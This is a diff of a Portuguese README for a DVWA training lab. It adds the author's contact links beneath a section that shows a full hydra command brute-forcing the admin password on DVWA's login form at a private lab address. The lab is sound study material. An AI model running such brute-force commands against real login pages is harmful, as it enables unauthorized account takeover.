@@ -62,3 +62,12 @@ Simulação de quebra de login no formulário **Brute Force** do DVWA. A ferrame
 
 ```bash
 hydra -l admin -P wordlists/senhas.txt 192.168.56.102 http-post-form "/dvwa/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login:H=Location: /dvwa/vulnerabilities/brute/" -V -f
+
+
+| Plataforma | Link |
+| :--- | :--- |
+| **GitHub** (Todos Repositórios) | [https://github.com/FabioWlademir?tab=repositories](https://github.com/FabioWlademir?tab=repositories) |
+| **LinkedIn** (Perfil Profissional) | [https://www.linkedin.com/in/fabiowlademir](https://www.linkedin.com/in/fabiowlademir) |
+| **Website/Blog** (Artigos e Tutoriais) | [f2suporte.blogspot.com](https://f2suporte.blogspot.com) |
+| **Página Pessoal** (GitHub Pages) | [https://fabiowlademir.github.io/](https://fabiowlademir.github.io/) |
+| **E-mail** | `f2suporte@gmail.com` |
